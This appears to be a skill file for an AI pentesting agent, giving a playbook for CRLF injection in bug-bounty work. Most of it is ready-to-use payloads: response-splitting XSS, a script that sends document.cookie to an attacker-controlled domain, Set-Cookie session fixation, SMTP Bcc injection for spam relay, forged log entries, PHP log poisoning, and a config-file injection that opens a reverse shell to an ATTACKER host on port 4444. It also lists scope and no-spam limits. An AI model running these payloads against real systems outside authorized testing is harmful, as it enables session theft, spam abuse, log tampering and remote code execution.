---
name: crlf
description: CRLF Injection — HTTP response splitting, header injection, XSS via injected Content-Type, Set-Cookie injection, SMTP header injection, and log injection. Use when HauntMode flags CRLF as APPLIES/MAYBE, when user input is reflected in HTTP headers (Location, Refresh, Set-Cookie, X-Forwarded-For, or any custom header), or when input is logged or included in email headers.
---

# CRLF Injection

This skill covers detection, confirmation, and exploitation of CRLF injection across all contexts: HTTP response splitting → XSS, Set-Cookie injection, SMTP header injection, and log injection/poisoning. Read top to bottom on first use.

---

## 1. Triggers — when this skill applies

- Any parameter that controls a redirect target (`?redirect=`, `?url=`, `?target=`, `?next=`, `?return=`)
- User input reflected in `Location:`, `Refresh:`, or any custom header value
- Contact forms, email forms where user-supplied name/email/subject is used in SMTP headers
- Any input that gets written to a log file — especially if the log is later viewed in a web UI
- `X-Forwarded-For` or other IP-reflection headers that appear in logs
- Responses with `Set-Cookie` where user-controlled input ends up in the cookie name/value
- File download/upload systems where a filename appears in a `Content-Disposition` header

---

---

## 3. 30-second triage

Inject a probe that adds a custom header. If the response contains `X-CRLF-Test: injected`, CRLF is confirmed:

```
?param=value%0d%0aX-CRLF-Test:%20injected
```

Try each encoding variant — servers and WAFs sanitize different representations:

| Encoding | Payload |
|---|---|
| Standard URL | `%0d%0a` |
| LF only | `%0a` |
| Raw (if not URL-decoded twice) | `%0D%0A` |
| Double-encoded | `%250d%250a` |
| Unicode full-width CRLF | `%E5%98%8A%E5%98%8D` |
| Raw (for Burp Repeater) | `\r\n` (paste literal in raw view) |

Check the response headers for your injected header. If the response body changes or the redirect target changes, CRLF is present.

**Skip deep dive if:** The parameter is HTML-encoded in the header value (e.g., `%0d%0a` appears literally in the header as the string `%0d%0a`, not as a newline). That's output encoding working correctly.

---

## 4. Context identification

Before testing, identify where user input lands:

1. **Redirect parameter in `Location:` or `Refresh:` header** — most common, highest impact (→ response splitting)
2. **Email form field reflected in SMTP headers** — `From:`, `Subject:`, `Reply-To:` (→ SMTP injection)
3. **Input written to a log file** — any message/name/IP field that appears in log viewer (→ log injection)
4. **Cookie name or value** — `Set-Cookie:` injection to set attacker cookies

Confirm the context from the response headers in Burp Proxy history.

---

## 5. Detection

### 5.1 HTTP Header Injection (redirect/Refresh context)

Target: app uses `?target=` or `?redirect=` to set `Location:` or `Refresh:` header.

Probe:
```
GET /?target=https://example.com%0d%0aTest:%20injected HTTP/1.1
Host: TARGET
```

Expected if vulnerable: response contains `Test: injected` as a header.

If `Location:` is involved (302 redirect):

```
GET /?target=%0d%0aTest:%20injected HTTP/1.1
```

Note: an empty `Location:` value (injecting before any domain) causes some browsers to display the body instead of redirecting — useful for XSS.

### 5.2 SMTP Header Injection

Target: contact form where user-supplied email address or name is included in SMTP headers.

Probe — inject into the email field:
```
email=evil@attacker.com%0d%0aTestheader:%20Testvalue
```

If the app sends an email and you receive it (add yourself as `Cc`), check headers for your injected value. Without backend access, assume vulnerable if the app accepts the input without stripping `%0d%0a`.

### 5.3 Log Injection

Target: any input field where special characters (like `'`) are logged and the log is viewable.

Probe:
```
name=testuser%0d%0aFakelogentry:%20admin%20logged%20in
```

Check the log viewer endpoint (often `/log.php`, `/logs`, `/admin/logs`) for the injected line.

---

## 6. Exploitation

### 6.1 XSS via HTTP Response Splitting (Refresh/Location header)

Inject double CRLF to terminate the header section and inject a response body:

**Refresh header context (200 response):**
```
GET /?target=https://example.com%0d%0a%0d%0a<html><script>alert(document.cookie)</script></html>
```
Two CRLFs (`%0d%0a%0d%0a`) end the headers. Everything after becomes the response body. The original page content is appended but JavaScript executes first.

**Location header context (302 response):**

Empty Location bypasses the redirect — browser displays the injected body instead of redirecting:
```
GET /?target=%0d%0a%0d%0a<html><script>alert(document.cookie)</script></html>
```

**With explicit Content-Type injection (for reliable XSS):**
```
GET /?target=%0d%0aContent-Type:%20text/html%0d%0a%0d%0a<script>alert(document.cookie)</script>
```

This is more reliable: injecting `Content-Type: text/html` before the body ensures the browser renders it as HTML.

**Full cookie exfiltration payload:**
```
GET /?target=%0d%0aContent-Type:%20text/html%0d%0a%0d%0a<script>new%20Image().src='YOUR_EZXSS_DOMAIN/crlf?c='+document.cookie</script>
```

Important: paste the final payload in-browser, not just Burp, to confirm execution (Burp Repeater won't execute JS).

### 6.2 Set-Cookie Injection

Inject a session cookie to fix the victim's session (session fixation), or poison a security-relevant cookie:

```
GET /?param=value%0d%0aSet-Cookie:%20session=attacker_session_id;%20Path=/
```

If the victim's browser loads this URL, their browser sets the injected cookie. Combine with session fixation: make the victim log in with a session ID you chose, then use that ID yourself.

**Set secure flag or HttpOnly on injected cookie:**
```
%0d%0aSet-Cookie:%20auth=1;%20Secure;%20HttpOnly;%20Path=/
```

### 6.3 SMTP Header Injection — add recipients

Target: email address field reflected in the `From:` SMTP header.

**Add Cc to receive a copy:**
```
email=evil@attacker.com%0d%0aCc:%20attacker@example.com
```

If the app appends characters after our input (e.g., an `!` in Subject), always add a dummy header at the end to absorb the appended data:

```
email=evil@attacker.com%0d%0aCc:%20attacker@example.com%0d%0aDummyheader:%20abc
```

The `Dummyheader:` swallows any trailing characters that would otherwise corrupt the Cc address.

**Mass email injection (spam relay PoC):**
```
email=evil@attacker.com%0d%0aBcc:%20victim1@x.com,%20victim2@x.com%0d%0aDummyheader:%20abc
```

For bug bounty: PoC with a single email to your own address. Do not spam.

**Name field → Subject injection:**
```
name=Test%0d%0aTo:%20attacker@example.com%0d%0aDummyheader:%20abc
```

### 6.4 Log Injection — forge entries

Target: input written to a log that's viewable via `/log.php` or similar.

**Forge a fake log entry for another user:**
```
message=legitimate'+--+-%0a%0dMalicious+message+from+admin+(127.0.0.1):+'+OR+1=1+--+-
```

This inserts a fabricated line that looks like the admin performed an action, undermining log integrity.

**Log poisoning → RCE (requires LFI to execute):**
Inject PHP code into the log, then exploit LFI to include the log file:
```
name=<?php+system('id');+?>
```

This only leads to RCE in combination with a Local File Inclusion vulnerability. Cross-reference `file-inclusion` skill.

### 6.5 Security header bypass via CRLF

If the app sets `X-Frame-Options`, `Content-Security-Policy`, or other security headers, you can override them by injecting your own version before theirs (first header wins in some parsers) or by injecting a conflicting one:

```
?param=value%0d%0aX-Frame-Options:%20ALLOWALL
```

### 6.6 CRLF injection in persisted config field → config file injection → RCE

When a user-supplied text field (e.g. SMTP password, server hostname, description) is written verbatim into an INI/TOML/config file on the server, CRLF characters in the value break out of the value and inject new config keys or sections:

```
# Input in SMTP password field:
x\r\n[plugin.grafana-image-renderer]\r\nrendering_args=--renderer-cmd-prefix=bash -c bash$IFS-l$IFS>$IFS/dev/tcp/ATTACKER/4444$IFS0<&1$IFS2>&1
```

The config file on disk becomes:
```ini
[smtp]
password = x
[plugin.grafana-image-renderer]
rendering_args=--renderer-cmd-prefix=bash -c ...
```

**How to detect the vector:** Find any admin/config UI field whose value ends up in a config file (SMTP settings, plugin configuration, data source settings). Test with `x\r\nINJECTED_KEY=test` and check if an INJECTED_KEY shows up in any exported config or produces an error about an unexpected config key.

**Escalation:** The injected config key doesn't have to be the same service — look for plugins or renderers loaded from the same config file. Fields like `rendering_args`, `exec_cmd`, `script_path` that accept system commands are ideal targets once you can inject into the right config section.

**Broadly applicable to:** Grafana, Prometheus, any Go/Python/Ruby app that writes user config to disk in INI/TOML/YAML format without sanitizing newlines before write.

---

## 7. Bypass techniques

### When `%0d%0a` is filtered

Try alternatives one at a time:

1. `%0a` alone (LF only — many HTTP parsers accept LF as a line terminator)
2. `%0D%0A` (uppercase hex)
3. `%250d%250a` (double URL-encode — works if the app decodes twice)
4. `%E5%98%8A%E5%98%8D` (Unicode full-width CRLF — bypasses some WAF string matches)
5. Raw bytes in Burp Hex view: replace the URL-encoded value with literal 0x0D 0x0A bytes

### When the app appends characters after your input

Always close with a dummy header:
```
%0d%0aDummyheader:%20
```

This absorbs trailing characters (punctuation, spaces) that would otherwise corrupt your injected header value.

### Redirect parameter rejects non-URL values

Some apps validate the redirect target as a URL. Bypass with:
```
https://legitimate-domain.com%0d%0aX-Injected:%20header
```
The URL part passes validation; CRLF comes after.

---

## 8. False-positive checks

- **Literal `%0d%0a` in header value** — if the server HTML-encodes or percent-encodes your CRLF characters and they appear literally in the header value, there is no injection. The header must contain an actual newline.
- **Response appears split but Content-Type is wrong** — injected body content that shows as `text/plain` won't execute JS. Confirm with `Content-Type: text/html` injection.
- **XSS fires in Burp Repeater raw view** — Repeater shows raw bytes and won't confirm execution. Always test the payload in an actual browser.
- **SMTP injection: no email received** — the app may not actually send emails or may filter recipients. Confirm by checking if SMTP traffic is visible in Burp proxy or by sending to a confirmed address.
- **Log injection visible but app sanitizes HTML** — if the log viewer HTML-encodes output, you can forge text entries but not escalate to stored XSS via logs.

---

## 9. Chain candidates

| Chain | Other skill | Impact uplift |
|---|---|---|
| CRLF → XSS via response splitting | `xss` | Reflected XSS via header injection (may bypass CSP if CSP is header-delivered and you inject before it) |
| CRLF → Set-Cookie → session fixation | `auth-bypass` | Force victim to use attacker-chosen session, then authenticate as them |
| CRLF → log poisoning + LFI | `file-inclusion` | RCE via log include |
| CRLF → inject CSP bypass header | `xss` | Override Content-Security-Policy to enable XSS on otherwise protected page |
| CRLF + cache poisoning | `cache-poisoning` | Cache a poisoned response with injected headers for all users |
| SMTP injection → phishing | `xss` | Forge email from trusted domain to internal targets |
| CRLF → request smuggling variant | `request-smuggling` | Some parsers treat injected CRLF in headers as request boundary |

---

## 10. Reporting template

```
POTENTIAL FINDING: CRLF Injection — <HTTP Response Splitting | Set-Cookie Injection | SMTP Header Injection | Log Injection>
Target: <full URL or form endpoint>
Parameter: <param name + location: query/body/header>
Injection context: <Location header | Refresh header | From SMTP header | log file>
Working payload:
    <exact URL-encoded payload>
Evidence:
    <response excerpt showing injected header, XSS execution in browser, email received, forged log entry>
Impact:
    <e.g. "Reflected XSS delivered via injected Content-Type and response body" or
     "Attacker-chosen cookie set on victim's browser enabling session fixation" or
     "Arbitrary email recipients added to outgoing emails — spam relay possible" or
     "Log entries forged — incident response integrity undermined">
Chain potential: <escalation via cache poisoning, LFI, session fixation, etc.>
Next step: <e.g. "Deliver XSS payload to admin via crafted link",
            "Confirm session fixation attack works end-to-end",
            "Test whether log poisoning + LFI leads to RCE">
```

---

## 11. Recon tracker vector strings

**Only log if explicitly authorized.**

- `crlf:header-injection:<param>` — header injected via named param
- `crlf:response-splitting:<param>` — double CRLF splits response body
- `crlf:xss:<param>` — XSS confirmed via response splitting
- `crlf:set-cookie:<param>` — cookie injected via CRLF
- `crlf:smtp:<field>` — SMTP header injection via named form field
- `crlf:log-injection:<field>` — log entry forged via named field
- `crlf:no:<param>` — tested, sanitized/encoded correctly

---

## 12. What NOT to do

- **Do not use mass recipient injection on production** — injecting a list of thousands of email recipients via SMTP injection causes real spam to be sent from the target's mail server. PoC with a single address (your own) only.
- **Do not execute XSS payloads that deface or disrupt** — use `alert(document.cookie)` or `new Image().src=...` only. Do not inject `<script>document.body.innerHTML=''</script>` or anything destructive.
- **Do not test out-of-scope domains** — check `scope.txt`.
- **Do not log to recon tracker without explicit instruction** (CLAUDE.md hard rule).
- **Do not claim log poisoning RCE without confirmed LFI** — log injection without LFI is a separate, lower-severity finding.
- **Do not use Burp Active Scanner** — Community edition only; all testing is manual.
